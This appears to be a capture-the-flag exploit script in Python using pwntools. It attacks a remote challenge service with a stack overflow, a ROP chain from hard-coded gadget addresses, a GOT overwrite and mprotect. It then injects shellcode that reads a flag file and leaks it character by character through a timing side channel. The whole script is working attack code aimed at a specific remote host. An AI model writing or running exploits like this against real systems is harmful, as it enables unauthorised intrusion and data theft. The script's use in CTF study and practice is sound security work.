#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from hashlib import *
import time
import string
import sys
host = "10.211.55.13"
#host = "35.189.186.86"
host = "202.120.7.203"
port = 666
#port = 8888

# Just use side channel attack to leak flag

for c in string.letters+string.digits + "{}_" :
    print "text:" + c
    r = remote(host,port)
    def proof_of_work(chal):
        gg = ''.join(chr(i) for i in range(256))
        while True:
            sol = ''.join(random.choice(gg) for _ in xrange(4))
            if sha256(chal + sol).hexdigest().startswith('00000'):
                return sol

    r.send(proof_of_work(r.recvline().strip()))
    context.arch = "amd64"

    sc = asm("""
        jmp str
    open:
        mov rax,2
        pop rdi
        xor rsi,rsi
        syscall

    read:
        mov rdi,rax
        xor rax,rax
        mov rsi,0x601f00
        mov rdx,0x80
        syscall

    readsc :
        xor rax,rax
        xor rdi,rdi
        mov rsi,0x601600
        mov rdx,0x100
        syscall

        mov r15,0x601600
        jmp r15

    str :
        call open
        .ascii "./flag"
        .byte 0
    """)

    pop_rdi = 0x0000000000400a53
    pop_rsi_r15 = 0x0000000000400a51
    pop_13_14_15 = 0x0000000000400a4e
    pop_rsp_13_14_15 = 0x0000000000400a4d
    pop_12_13_14_15 = 0x0000000000400a4c
    pop_rbx_rbp_12_13_14_15 = 0x400a4a
    buf = 0x6010c0
    buf2 = buf+0x500
    scbuf = buf + 0x800
    read = 0x400730
    read_got = 0x601048
    alarm = 0x400720
    alarm_got = 0x601040
    rop = flat([pop_rdi,0,pop_rsi_r15,buf,0,read,pop_rsp_13_14_15,buf])

    payload = "a"*40 + rop
    #r.sendline(payload)
    time.sleep(0.1)
    csu = 0x400a30
    rop2 = flat([0,0,0,pop_rdi,0,pop_rsi_r15,buf2,0,read,pop_rsp_13_14_15,buf2]) + flat([pop_rsi_r15,0x601198,0,read,0,pop_rbx_rbp_12_13_14_15,0,1,alarm_got,7,0x1000,0x601000,csu])  + p64(0)*7 + p64(scbuf)
    print len(rop2)
    time.sleep(0.1)
    #r.send(rop2)
    #rop3 = flat([0,0,0,pop_rdi,0,pop_rsi_r15,scbuf,0,read,pop_rsp_13_14_15,0x601618]) + flat([0,0,0,pop_rdi,0,pop_rsi_r15,alarm_got,0,read,pop_rbx_rbp_12_13_14_15,0,1,alarm_got,0,0,0,pop_rsp_13_14_15,buf+0x40]) 

    rop3 = flat([0,0,0,pop_rdi,0,pop_rsi_r15,scbuf,0,read,pop_rsp_13_14_15,0x601618]) 
    rop3 += flat([0,0,0,pop_rbx_rbp_12_13_14_15,0,1,read_got,10,alarm_got-9,0,csu])
    rop3 += flat([0,0,0,0,0,0,0,pop_rsp_13_14_15,0x601140-0x18])
    #r.sendline(rop3)

    time.sleep(0.1)
    #r.sendline(sc)

    time.sleep(0.1)
    #r.send("a"*9 + "\x85")
    flag = 0x601f00 + int(sys.argv[1])
    char = ord(c)
    sc2 = asm("""
        xor rdi,rdi
        xor rsi,rsi
        xor rcx,rcx
        mov rdi,%s
        mov rsi,%s
        mov cl,byte ptr [rdi]
        cmp rcx,rsi
        jne ggwp
    fuck :
        jmp fuck

    ggwp :
        mov rax,0x3c
        mov rdi,0
        syscall
    """ % (hex(flag),hex(char)))

    time.sleep(0.01)
    #r.sendline(sc2)
    flag = 0x601f00
    #pad_len = 0x800 - (len(payload) + len(rop2) + len(rop3) + len(sc) + 10 + len(sc2))
    #print pad_len
    #r.send("\x00".ljust(pad_len,"\x00"))
    t = time.time()
    r.send((payload.ljust(256,"\x00") + rop2 + rop3.ljust(256,"\x00")  + sc.ljust(256,"\x00")  +"a"*9 + "\x85" + sc2.ljust(256,"\x00")).ljust(0x800,"\x00"))
    try  :
        r.recv()
    except EOFError:
        pass
    dt = time.time() - t
    if dt > 2 :
        print "correct : " + sys.argv[1] + ":" + c
	exit()
    r.close()
